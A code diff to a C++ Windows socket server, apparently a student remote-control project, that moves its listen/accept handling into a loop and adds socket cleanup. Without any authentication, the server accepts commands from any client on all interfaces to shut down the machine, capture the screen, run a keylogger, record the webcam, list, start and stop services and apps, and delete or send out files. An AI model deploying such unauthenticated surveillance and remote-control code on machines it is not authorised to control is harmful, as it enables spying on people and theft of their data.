@@ -37,7 +37,7 @@ int main(int argc, char *argv[])
     cout << "\n===Step 3 - Bind Socket ===" << endl;
     sockaddr_in service;
     service.sin_family = AF_INET;
-    InetPton(AF_INET,"0.0.0.0", &service.sin_addr.s_addr);
+    InetPton(AF_INET, "0.0.0.0", &service.sin_addr.s_addr);
     service.sin_port = htons(port);
     if (bind(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR)
     {
@@ -50,23 +50,39 @@ int main(int argc, char *argv[])
     {
         cout << "bind() is OK!" << endl;
     }
-    cout << "\n=== Step 4===" << endl;
-    if (listen(serverSocket, 1) == SOCKET_ERROR)
-        cout << "listen(): Error listening on socket" << WSAGetLastError() << endl;
-    else
-        cout << "listen() is OK. I waiting for connections..." << endl;
-    cout << "===Step 5: Accept connection===" << endl;
-    acceptSocket = accept(serverSocket, NULL, NULL);
-    if (acceptSocket == INVALID_SOCKET)
-    {
-        cout << "accept failed: " << WSAGetLastError() << endl;
-        WSACleanup();
-        return -1;
-    }
-    cout << "Accept connection" << endl;
-	cout << "\n=== Step 6 - Chat to the Client ===\n\n";
+    // cout << "\n=== Step 4===" << endl;
+    // if (listen(serverSocket, 1) == SOCKET_ERROR)
+    //     cout << "listen(): Error listening on socket" << WSAGetLastError() << endl;
+    // else
+    //     cout << "listen() is OK. I waiting for connections..." << endl;
+    // cout << "===Step 5: Accept connection===" << endl;
+    // acceptSocket = accept(serverSocket, NULL, NULL);
+    // if (acceptSocket == INVALID_SOCKET)
+    // {
+    //     cout << "accept failed: " << WSAGetLastError() << endl;
+    //     WSACleanup();
+    //     return -1;
+    // }
+    // cout << "Accept connection" << endl;
+	// cout << "\n=== Step 6 - Chat to the Client ===\n\n";
     while (true) // server.cpp
     {
+        // cout << "\n=== Step 4===" << endl;
+        if (listen(serverSocket, 1) == SOCKET_ERROR)
+            cout << "listen(): Error listening on socket" << WSAGetLastError() << endl;
+        else
+            cout << "listen() is OK. I waiting for connections..." << endl;
+        cout << "=== Accept connection ===" << endl;
+        acceptSocket = accept(serverSocket, NULL, NULL);
+        if (acceptSocket == INVALID_SOCKET)
+        {
+            cout << "accept failed: " << WSAGetLastError() << endl;
+            continue;
+            // WSACleanup();
+            // return -1;
+        }
+        cout << "Accept connection" << endl;
+
         char messageFromServer[bufferSize] = {};
         char messageFromClient[bufferSize] = {};
         int byteCount = recv(acceptSocket, messageFromClient, bufferSize, 0);
@@ -75,12 +91,17 @@ int main(int argc, char *argv[])
             cout << "Message length: " << strlen(messageFromClient) << endl;
         }
         else WSACleanup();
-        if (string(messageFromClient) == "shutdown") 
-                system("shutdown /s /f /t 0");
+        if (string(messageFromClient) == "shutdown") {
+            closesocket(acceptSocket);
+            WSACleanup();
+            system("shutdown /s /f /t 0");
+        } 
         else if (string(messageFromClient) == "restart")
         {
+            closesocket(acceptSocket);
+            WSACleanup();
             #ifdef _WIN32
-                system("shutdown /r /t 0");  // Lệnh restart cho Windows
+            system("shutdown /r /t 0");  // Lệnh restart cho Windows
             #endif
         }
         else if (string(messageFromClient) == "capturescreen") // Send the bitmap file
@@ -114,6 +135,7 @@ int main(int argc, char *argv[])
             if (sentBytes == SOCKET_ERROR) 
                 cout << "Error sending file data: " << WSAGetLastError() << endl;
             delete[] fileBuffer;
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "listservice")
         {
@@ -152,6 +174,7 @@ int main(int argc, char *argv[])
             }
             delete[] fileBuffer;
             // cout << "File example.txt sent successfully." << endl;
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "keylogger")
         {
@@ -190,7 +213,8 @@ int main(int argc, char *argv[])
                 }
                 sentBytes += result;
             }
-            delete[] fileBuffer;         
+            delete[] fileBuffer;
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "startservice")
         {
@@ -202,7 +226,8 @@ int main(int argc, char *argv[])
                 anotherMessageFromServer = string(serviceToStart) + " start sucessfully";
             else 
                 anotherMessageFromServer = string(serviceToStart) + " start unsucessfully";
-            send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);   
+            send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);  
+            closesocket(acceptSocket); 
         }
         else if (string(messageFromClient) == "stopservice")
         {
@@ -215,6 +240,7 @@ int main(int argc, char *argv[])
             else 
                 anotherMessageFromServer = string(serviceToStop) + " stop unsucessfully";
             send(acceptSocket, anotherMessageFromServer.c_str(), 1024, 0);   
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "listapp")
         {   
@@ -239,6 +265,7 @@ int main(int argc, char *argv[])
                 cout << "Message sent: " << "Sent image name list successfully!" << endl;
             else
                 WSACleanup();
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient).substr(0, 7) == "openapp")
         {
@@ -258,6 +285,7 @@ int main(int argc, char *argv[])
                 cout << "Message sent: " << messageFromServer << endl;
             else 
                 WSACleanup();
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient).substr(0, 8) == "closeapp")
         {
@@ -293,7 +321,7 @@ int main(int argc, char *argv[])
                 cout << "Message sent: " << messageFromServer << endl;
             else 
                 WSACleanup();
-
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient).substr(0, 10) == "deletefile")
         {
@@ -315,6 +343,7 @@ int main(int argc, char *argv[])
                 else 
                     WSACleanup();
             }
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient).substr(0, 7) == "getfile")
         {
@@ -340,14 +369,15 @@ int main(int argc, char *argv[])
                     cout << "Message sent: " << messageFromServer << endl;
                 else 
                     WSACleanup();
-
             }
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "startwebcam")
         {
-            std::thread videoThread(recordVideo, "output.mp4", 640, 480, 15);
+            std::thread videoThread(recordVideo, "output.mp4", 640, 480, 10);
             videoThread.detach();
             // videoThread.join();
+            closesocket(acceptSocket);
         }
         else if (string(messageFromClient) == "stopwebcam"){
             stopRecord();
@@ -363,16 +393,8 @@ int main(int argc, char *argv[])
             else 
                 WSACleanup();
             resetFlag();
+            closesocket(acceptSocket);
         }
-        // else if (string(messageFromClient) == "stopWebcam")
-        // {
-        //     stopRecording();
-        //     sendVideoFile(videoFileName, acceptSocket);
-        // }
-        // cout << "Please enter a message to send to the Client: ";
-        // cin.getline(messageFromServer, 1024);
-        // cout << messageFromServer << endl;
-        // byteCount = send(acceptSocket, messageFromServer, 1024, 0);
     }
     system("pause");
     WSACleanup();
